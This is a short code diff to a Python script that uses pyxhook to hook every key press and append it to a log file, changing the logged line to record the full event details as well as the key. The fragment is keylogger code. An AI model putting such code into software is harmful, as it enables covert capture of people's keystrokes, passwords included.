@@ -18,7 +18,7 @@ print("hello")
     # on key press file to test my app
 def OnKeyPress(event):
     with open(file_log,'a') as f:
-        f.write(f'{event.Key}')
+        f.write(f'{event.Key} {event}')
 
 
 new_hook = pyxhook.HookManager()
